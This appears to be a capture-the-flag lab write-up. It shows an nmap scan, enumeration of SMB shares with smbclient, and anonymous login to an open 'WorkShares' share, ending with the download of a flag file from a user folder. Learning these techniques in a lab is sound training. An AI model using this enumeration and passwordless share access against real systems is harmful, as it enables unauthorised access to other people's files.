---- 
## Initial Information

- Attacker IP = 10.129.241.49
- Victim IP = 10.129.240.253
----
## Recon

- Scan the victim machine using nmap -  found that they are running 3 services which

```shell
nmap 10.129.240.253

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

found that they are running SMB (Server Message Block) on port 445 which ""microsoft-ds"" in the NMAP scan
this means that we can use smbmap to scan the system

- ran smbclient inorder to get the number and name of the shares without using a password - found 4 shares and their name 
```shell

smbclient -L 10.129.240.253 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk    
```

- Attempted to login to the different share  without a password 
	- Tried to connect to ADMIN$ but this failed as it requires a password
```shell
smbclient -L \\\\10.129.240.253\\ADMIN$
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.240.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
- Tried C$ but this failed 
```shell

smbclient -L \\\\10.129.240.253\\C$    
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.240.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Tried IPC$ this also failed 
```shell
smbclient -L \\\\10.129.240.253\\IPC$    
Password for [WORKGROUP\root]:

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.240.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Tried WorkShares this succeded
```shell
smbclient \\\\10.129.240.253\\WorkShares  
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> 

```
- Got worknotes in Amys folder to start a webserver
- Got navigated to the James folder and found the flag
```shell
smb: \> cd James.P\
smb: \James.P\> ls
 
flag.txt                            A       32  Mon Mar 29 

smb: \James.P\> get flag.txt 

getting file \James.P\flag.txt of size 32 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

```